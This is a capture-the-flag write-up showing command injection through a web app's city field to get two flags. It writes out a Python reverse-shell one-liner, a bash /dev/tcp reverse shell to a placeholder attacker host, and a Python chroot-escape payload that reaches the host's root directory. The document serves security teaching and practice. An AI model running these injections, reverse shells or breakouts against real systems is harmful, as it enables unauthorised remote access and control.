# change-racines
# Flag 1

## Recon

Information available:
- http://REDACTED:9090
- https://www.cheswick.com/ches/papers/berferd.pdf

The app: 

![alt text](img/app.png)

There is a City field and a refresh button

Without any value in the city field, lets hit refresh:
```python
(b'\n', None)
```
Well well well, look like python to me!

`None` Lets try a string in the city field now:

```python
(b'PlatypusJovial\n', None)
```
Humm, straith python?
`import os; print('\n'.join(os.listdir('.')))`

```python
(b"/bin/bash: -c: line 1: syntax error near unexpected token `'\\n'.join'\n/bin/bash: -c: line 1: `echo import os; print('\\n'.join(os.listdir('.')))'\n", None)
```

/bin/bash -c.. humm `ls`?
```python
(b'ls\n', None)
```

Humm `$(ls)`
```python
(b'__pycache__ app.py bin etc flag1 get-pip.py lib lib64 python root templates usr\n', None)
```

That was an easy one `$(cat flag1)`
```python
(b'/bin/bash: line 1: cat: command not found\n\n', None)
```
Aw.. oh.. maybe not so easy. Clearly python is there somewhere! Is it time for a python a reverse shell?
https://www.revshells.com

Had to adapt it to the situation
```python
$(./python/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')
```

And finally.. i broke the toy.. (On the writeups instance)
```python
nc -lvnp REDACTED
listening on [any] REDACTED ...

connect to [REDACTED] from (UNKNOWN) [REDACTED] REDACTED
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/python/lib/python3.9/pty.py", line 156, in spawn
    pid, master_fd = fork()
  File "/python/lib/python3.9/pty.py", line 97, in fork
    master_fd, slave_fd = openpty()
  File "/python/lib/python3.9/pty.py", line 30, in openpty
    master_fd, slave_name = _open_terminal()
  File "/python/lib/python3.9/pty.py", line 60, in _open_terminal
    raise OSError('out of pty devices')
OSError: out of pty devices
```
Oh ... 

## Edit:
I have been told that I was wrong and it was normal.. and they were right!
Lets do it the good old-fasionned way
```
$(bash -i >& /dev/tcp/$IP/$PORT 0>&1)
```

There i go!
```
bash: cannot set terminal process group (92): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1# ls
ls
__pycache__
app.py
bin
etc
flag1
get-pip.py
lib
lib64
python
root
templates
usr
```
Reading the flag with python
```
./python/bin/python -c "print(open('flag1').read())"
```
```
bash-5.1# ./python/bin/python -c "print(open('flag1').read())"
./python/bin/python -c "print(open('flag1').read())"
FINCTF{Je-vous-4ssure-personne-ne-p3ut-obtenir-l3-seucrait!}
```

# Flag 2 : Get out of jail.. (in this case.. chroot)

With python
```
if not os.path.exists("chroot"):
    os.mkdir("chroot")
os.chroot("chroot")
```
Getting myself cozy in a brand new jail

Sending this payload https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/
```python
import os; os.chroot("chroot"); [os.chdir("..") for _ in range(10)]; os.chroot("."); os.system("/bin/sh");
```

Result:
```
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

In root folder
```
cd /root
ls
app.py
app.zip
chroot
create-env.sh
flag1
flag2
index.html
libnsl.so.2
libnsl.so.2.0.1
python.zip
cat flag2
FINCTF{n0o0o0o0-Nicéphore-va-devoir-travailler-très-tard}
```

Oink oink!